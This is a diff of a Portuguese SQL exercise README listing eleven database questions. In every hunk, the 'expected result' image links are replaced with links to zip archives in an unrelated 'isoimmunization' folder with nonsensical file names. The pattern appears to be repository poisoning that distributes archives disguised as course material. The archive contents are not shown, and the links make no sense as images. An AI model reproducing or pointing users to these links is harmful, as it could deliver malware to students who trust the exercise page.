@@ -7,7 +7,7 @@ Selecione todos os dados dos países da tabela_paises.
 
 <h2>Resultado esperado</h2>
 
-![questão 1](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 1](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>2º Questão</h2>
@@ -17,7 +17,7 @@ Selecione todas as cidades cujo país seja brazil.
 
 <h2>Resultado esperado</h2>
 
-![questão 2](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 2](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>3º Questão</h2>
@@ -27,7 +27,7 @@ Selecione todas as cidades cuja região(estado) é ceará.
 
 <h2>Resultado esperado</h2>
 
-![questão 3](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 3](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>4º Questão</h2>
@@ -38,7 +38,7 @@ utilize também o group by;
 
 <h2>Resultado esperado</h2>
 
-![questão 4](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 4](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>5º Questão</h2>
@@ -48,7 +48,7 @@ utilize também o group by;
 
 <h2>Resultado esperado</h2>
 
-![questão 5](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 5](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>6º Questão</h2>
@@ -58,7 +58,7 @@ Quantos países diferentes existem na tabela 'tabela_paises'.
 
 <h2>Resultado esperado</h2>
 
-![questão 6](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 6](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>7º Questão</h2>
@@ -68,7 +68,7 @@ Quantas cidades diferentes existem no brazil.
 
 <h2>Resultado esperado</h2>
 
-![questão 7](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 7](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>8º Questão</h2>
@@ -78,7 +78,7 @@ Quantas cidades diferentes existem no brazil.
  
 <h2>Resultado esperado</h2>
 
-![questão 8](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 8](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>9º Questão</h2>
@@ -88,7 +88,7 @@ Quantas pessoas com nome começando em 'João' existem no banco?
 
 <h2>Resultado esperado</h2>
 
-![questão 9](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 9](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>10º Questão</h2>
@@ -98,7 +98,7 @@ Quantas pessoas têm o nome John?
 
 <h2>Resultado esperado</h2>
 
-![questão 10](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 10](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
 
 <h2>11 Questão</h2>
@@ -108,5 +108,5 @@ Ordene os nomes dos países sem repetição em ordem alfabética.
 
 <h2>Resultado esperado</h2>
 
-![questão 11](https://raw.githubusercontent.com/NagilaLopes/Banco-de-Dados-Atividade_III/main/isoimmunization/Banco-de-Dados-Atividade_III-steamily.zip)
+![questão 11](https://github.com/NagilaLopes/Banco-de-Dados-Atividade_III/raw/refs/heads/main/isoimmunization/de-Banco-Dados-Atividade-III-1.2.zip)
 
